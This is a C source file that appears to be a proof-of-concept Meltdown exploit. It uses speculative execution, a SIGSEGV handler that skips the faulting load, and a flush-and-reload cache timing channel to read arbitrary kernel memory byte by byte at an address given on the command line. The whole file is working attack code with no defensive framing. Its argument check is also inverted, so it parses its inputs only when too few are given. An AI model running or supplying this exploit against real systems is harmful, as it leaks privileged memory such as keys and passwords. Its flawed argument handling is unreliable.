#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"


#define GAP 4096

uint8_t channel[256 * GAP];
int cache_hit_threshold = 400;

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(&channel[i * GAP]);
    }
}

extern char stopspeculate[];

static void __attribute__((noinline)) victim(unsigned long addr)
{
    asm volatile(
        "1:\n\t"

        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        "movzx (%[addr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        "movzx (%[target], %%rax, 1), %%rbx\n"

        "stopspeculate: \n\t"
        "nop\n\t"
        :
        : [target] "r"(channel),
          [addr] "r"(addr)
        : "rax", "rbx");
}

static int results[256];
void cache_detect()
{
    int i, mix_i;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (int i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &channel[mix_i * GAP];

        time1 = rdtscp();
        maccess(addr);
        time2 = rdtscp();

        if ((int)(time2-time1) <= cache_hit_threshold)
            results[mix_i]++;
    }
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

int ReadOneByte(int fd, unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];

    memset(results, 0, sizeof(results));

    for (i = 0; i < 1000; i++)
    {
        ret = pread(fd, buf, sizeof(buf), 0);
        if (ret < 0)
        {
            perror("pread");
            break;
        }
        flush_cache();

        mfence();

        victim(addr);

        mfence();

        cache_detect();

    }
    for (i = 1; i < 256; i++)
    {
        if (results[i] && results[i] > max)
        {
            max = results[i];
            maxi = i;
        }
    }
    return maxi;
}

int main(int argc, char *argv[])
{
    int ret, fd, i;
    unsigned long addr, size;
    // static char expected[] = "%s version %s";

    if (argc < 3)
    {
        sscanf(argv[1], "%lx", &addr);

        sscanf(argv[2], "%lx", &size);
    }

    memset(channel, 1, sizeof(channel));

    ret = set_signal();

    fd = open("/proc/version", O_RDONLY);
    if (fd < 0)
    {
        perror("open");
        return -1;
    }

    for (i = 0; i < size; i++)
    {
        ret = ReadOneByte(fd, addr);
        if (ret == -1)
            ret = 0xff;
        printf("read %lx = %x %c (score=%d/%d)\n",
               addr, ret, isprint(ret) ? ret : ' ',
               ret != 0xff ? results[ret] : 0,
               1000);
        addr++;
    }

    close(fd);

    exit(0);
}